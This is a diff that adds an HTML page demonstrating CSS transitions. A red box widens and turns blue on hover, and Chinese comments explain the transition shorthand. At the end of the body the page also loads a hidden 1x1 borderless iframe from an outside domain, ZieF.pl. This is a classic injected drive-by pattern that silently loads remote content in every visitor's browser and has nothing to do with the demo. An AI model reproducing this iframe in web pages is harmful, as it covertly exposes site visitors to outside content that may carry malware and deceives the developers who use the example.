@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title></title>
+    <!--  过渡 -->
+    <style>
+        .box{
+            width: 200px;
+            height: 200px;
+            border: 1px solid #000;
+            margin:100px auto;
+            background-color: red;
+
+            /* 过渡属性*/
+            /*transition:width 2s,background-color 2s;*/
+            /* 如果多个过度的 特性是一样的 可以简写*/
+            /* transition: 过渡属性 持续时间  运动曲线 延迟时间*/
+            transition:all 4s linear 1s ;
+
+            /* 过渡必须加给盒子本身*/
+        }
+
+        .box:hover{
+            width: 600px;
+            background-color: blue;
+            /*height:400px;*/
+        }
+    </style>
+</head>
+<body>
+    <div class="box"></div>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
